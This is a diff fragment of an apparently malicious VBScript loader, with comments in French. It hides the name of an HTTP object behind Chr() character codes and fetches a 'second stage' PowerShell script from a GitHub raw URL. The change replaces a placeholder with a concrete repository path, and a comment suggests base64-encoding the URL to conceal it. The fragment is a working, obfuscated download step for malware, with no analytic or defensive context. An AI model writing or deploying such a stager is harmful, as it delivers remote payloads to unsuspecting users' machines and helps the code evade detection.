@@ -22,7 +22,7 @@ xO = Chr(77) & Chr(83) & Chr(88) & Chr(77) & Chr(76) & Chr(50) & Chr(46) & Chr(8
 Set http = Execute(cO & "(""" & xO & """)")
 
 ' URL du second stage (encode-la en base64 si tu veux, ici en clair pour l'exemple)
-secondStageURL = "https://raw.githubusercontent.com/[ezemaillolbro-sudo]/[i-bak-bfr]/main/stage2.ps1"
+secondStageURL = "https://raw.githubusercontent.com/ezemaillolbro-sudo/i-bak-bfr/main/stage2.ps1"
 
 http.Open "GET", secondStageURL, False
 http.Send
